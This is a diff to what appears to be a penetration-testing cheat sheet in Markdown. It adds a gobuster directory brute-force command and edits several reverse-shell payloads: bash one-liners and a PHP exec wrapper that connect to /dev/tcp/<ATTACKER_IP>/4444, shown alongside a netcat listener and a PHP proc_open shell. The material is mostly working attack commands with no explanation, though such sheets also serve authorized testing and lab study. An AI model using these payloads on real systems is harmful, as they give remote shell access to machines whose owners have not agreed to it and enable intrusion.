@@ -19,6 +19,10 @@ gobuster dir -u https://<TARGET_IP> -w /usr/share/wordlists/SecLists/Discovery/W
 ```
 
 ```bash
+gobuster dir -u https://<TARGET_IP>  -w /usr/share/wordlists/dirb/big.txt
+```
+
+```bash
 gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,js
 ```
 
@@ -367,11 +371,11 @@ nc -lvnp 4444
 ## Bash Reverse Shells
 
 ```bash
-bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
+bash -c '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
 ```
 
 ```bash
-echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > script.sh
+echo '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > script.sh
 ```
 
 ```bash
@@ -408,7 +412,7 @@ $proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipe
 
 ```php
 <?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'");
+exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'");
 ?>
 ```
 
